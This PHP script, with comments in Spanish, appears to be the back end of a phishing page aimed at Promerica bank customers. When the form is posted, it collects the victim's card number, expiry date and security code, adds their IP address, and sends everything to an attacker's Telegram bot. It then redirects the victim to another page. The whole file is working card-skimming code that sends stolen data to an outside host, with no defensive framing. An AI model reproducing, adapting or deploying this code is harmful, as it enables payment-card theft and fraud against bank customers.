<?php
// Incluir el archivo data.php desde el mismo directorio
include __DIR__ . '/data.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener los datos del formulario
    $tarj = $_POST['tarj'];
    $fecha = $_POST['fecha'];
    $pass = $_POST['pass'];

    // Enviar los datos a Telegram
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $message = "
    PROMERICA TARJET:
    Tarjeta: {$tarj}\n
    Fecha de vencimiento: {$fecha}\n
    Código de seguridad: {$pass}\n
    IP: {$_SERVER['REMOTE_ADDR']}";

    $data = array(
        'chat_id' => $chatID,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ),
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    // Verificar si el mensaje se envió correctamente
    if ($result !== false) {
        header("Location: /otra_pagina.html");  // Redirigir a otra página después del envío exitoso
        exit();
    } else {
        echo "Error al enviar el mensaje a Telegram.";
    }
}
?>
